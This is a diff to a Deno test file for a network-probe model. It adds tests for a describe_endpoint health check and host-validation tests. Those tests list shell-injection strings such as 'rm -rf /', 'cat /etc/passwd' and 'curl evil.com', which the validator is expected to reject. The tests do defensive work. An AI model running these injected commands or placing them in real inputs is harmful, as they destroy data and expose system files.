@@ -339,10 +339,11 @@ Deno.test("network model: has valid version format", () => {
   assertEquals(calverRegex.test(model.version), true);
 });
 
-Deno.test("network model: has all 6 resource specs", () => {
+Deno.test("network model: has all 7 resource specs", () => {
   const expected = [
     "cert_info",
     "dns_records",
+    "endpoint_summary",
     "http_checks",
     "port_scan",
     "traceroute",
@@ -352,9 +353,10 @@ Deno.test("network model: has all 6 resource specs", () => {
   assertEquals(actual, expected);
 });
 
-Deno.test("network model: has all 6 methods", () => {
+Deno.test("network model: has all 7 methods", () => {
   const expected = [
     "cert_check",
+    "describe_endpoint",
     "dns_lookup",
     "http_check",
     "port_check",
@@ -1154,4 +1156,236 @@ Deno.test({
       Deno.connect = originalConnect;
     }
   },
+});
+
+// ---------------------------------------------------------------------------
+// describe_endpoint: aggregated health check
+// ---------------------------------------------------------------------------
+
+Deno.test({
+  name: "describe_endpoint: healthy endpoint returns all green",
+  sanitizeResources: false,
+  fn: async () => {
+    const originalFetch = globalThis.fetch;
+    globalThis.fetch = (
+      _input: string | URL | Request,
+      _init?: RequestInit,
+    ) => {
+      return Promise.resolve(
+        new Response("OK", {
+          status: 200,
+          statusText: "OK",
+          headers: { "content-type": "text/html" },
+        }),
+      );
+    };
+
+    const digJson = JSON.stringify([{
+      message: {
+        response_message_data: {
+          status: "NOERROR",
+          ANSWER: [{
+            name: "example.com.",
+            type: 1,
+            TTL: 300,
+            data: "93.184.216.34",
+          }],
+        },
+        response_address: "8.8.8.8",
+        query_time: 10,
+      },
+    }]);
+
+    // Certificate valid for 90 more days
+    const futureDate = new Date();
+    futureDate.setDate(futureDate.getDate() + 90);
+    const notAfterStr = futureDate.toUTCString().replace("GMT", "GMT");
+    const certOutput = [
+      "notBefore=Jan  1 00:00:00 2025 GMT",
+      `notAfter=${notAfterStr}`,
+      "subject=CN = example.com",
+      "issuer=C = US, O = Let's Encrypt, CN = R3",
+      "serial=ABC123",
+    ].join("\n");
+
+    await withMockedCommand(
+      (cmd, args) => {
+        if (cmd === "dig") {
+          return { stdout: digJson, stderr: "", success: true };
+        }
+        if (cmd === "bash" && args.includes("-c")) {
+          return { stdout: certOutput, stderr: "", success: true };
+        }
+        return { stdout: "", stderr: "", success: true };
+      },
+      async () => {
+        const { context, getWrittenResources } = createModelTestContext({
+          globalArgs: {},
+          definition: {
+            id: "test-id",
+            name: "test-probe",
+            version: 1,
+            tags: {},
+          },
+        });
+
+        const result = await model.methods.describe_endpoint.execute(
+          { host: "example.com", port: 443 },
+          context as unknown as Parameters<
+            typeof model.methods.describe_endpoint.execute
+          >[1],
+        );
+
+        assertEquals(result.dataHandles.length, 1);
+        const resources = getWrittenResources();
+        assertEquals(resources[0].specName, "endpoint_summary");
+
+        const data = resources[0].data as {
+          host: string;
+          dns: {
+            resolved: boolean;
+            records: Array<{ type: string; data: string }>;
+            error: string | null;
+          };
+          http: {
+            reachable: boolean;
+            statusCode: number;
+            error: string | null;
+          };
+          certificate: {
+            valid: boolean;
+            subject: string | null;
+            issuer: string | null;
+            daysUntilExpiry: number | null;
+            error: string | null;
+          };
+          healthy: boolean;
+        };
+
+        assertEquals(data.host, "example.com");
+        assertEquals(data.healthy, true);
+        assertEquals(data.dns.resolved, true);
+        assertEquals(data.dns.records.length, 1);
+        assertEquals(data.dns.records[0].data, "93.184.216.34");
+        assertEquals(data.dns.error, null);
+        assertEquals(data.http.reachable, true);
+        assertEquals(data.http.statusCode, 200);
+        assertEquals(data.http.error, null);
+        assertEquals(data.certificate.valid, true);
+        assertEquals(data.certificate.subject, "CN = example.com");
+        assertEquals(data.certificate.error, null);
+        assertEquals(
+          data.certificate.daysUntilExpiry !== null &&
+            data.certificate.daysUntilExpiry > 0,
+          true,
+        );
+      },
+    );
+
+    globalThis.fetch = originalFetch;
+  },
+});
+
+Deno.test({
+  name: "describe_endpoint: DNS failure marks unhealthy",
+  sanitizeResources: false,
+  fn: async () => {
+    const originalFetch = globalThis.fetch;
+    globalThis.fetch = () => {
+      throw new TypeError("DNS resolution failed");
+    };
+
+    await withMockedCommand(
+      (_cmd, _args) => ({
+        stdout: "",
+        stderr: "dig: couldn't resolve",
+        success: false,
+      }),
+      async () => {
+        const { context, getWrittenResources } = createModelTestContext({
+          globalArgs: {},
+          definition: {
+            id: "test-id",
+            name: "test-probe",
+            version: 1,
+            tags: {},
+          },
+        });
+
+        await model.methods.describe_endpoint.execute(
+          { host: "bad.invalid", port: 443 },
+          context as unknown as Parameters<
+            typeof model.methods.describe_endpoint.execute
+          >[1],
+        );
+
+        const data = getWrittenResources()[0].data as {
+          healthy: boolean;
+          dns: { resolved: boolean; error: string | null };
+        };
+        assertEquals(data.healthy, false);
+        assertEquals(data.dns.resolved, false);
+        assertEquals(typeof data.dns.error, "string");
+      },
+    );
+
+    globalThis.fetch = originalFetch;
+  },
+});
+
+Deno.test("describe_endpoint: rejects empty host", () => {
+  const r = model.methods.describe_endpoint.arguments.safeParse({ host: "" });
+  assertEquals(r.success, false);
+});
+
+Deno.test("describe_endpoint: defaults port to 443", () => {
+  const r = model.methods.describe_endpoint.arguments.safeParse({
+    host: "example.com",
+  });
+  assertEquals(r.success, true);
+  if (r.success) {
+    assertEquals(r.data.port, 443);
+  }
+});
+
+Deno.test("cert_check: rejects host with shell metacharacters", () => {
+  const cases = [
+    "example.com; rm -rf /",
+    "host$(whoami)",
+    "host`id`",
+    "host | cat /etc/passwd",
+    "host & curl evil.com",
+  ];
+  for (const h of cases) {
+    const r = model.methods.cert_check.arguments.safeParse({ host: h });
+    assertEquals(r.success, false, `should reject: ${h}`);
+  }
+});
+
+Deno.test("describe_endpoint: rejects host with shell metacharacters", () => {
+  const cases = [
+    "example.com; rm -rf /",
+    "host$(whoami)",
+    "host`id`",
+    "host | cat /etc/passwd",
+    "a b",
+  ];
+  for (const h of cases) {
+    const r = model.methods.describe_endpoint.arguments.safeParse({ host: h });
+    assertEquals(r.success, false, `should reject: ${h}`);
+  }
+});
+
+Deno.test("cert_check: accepts valid hostnames", () => {
+  const cases = [
+    "example.com",
+    "sub.domain.example.com",
+    "my-host.internal",
+    "192.168.1.1",
+    "host_name.local",
+  ];
+  for (const h of cases) {
+    const r = model.methods.cert_check.arguments.safeParse({ host: h });
+    assertEquals(r.success, true, `should accept: ${h}`);
+  }
 });
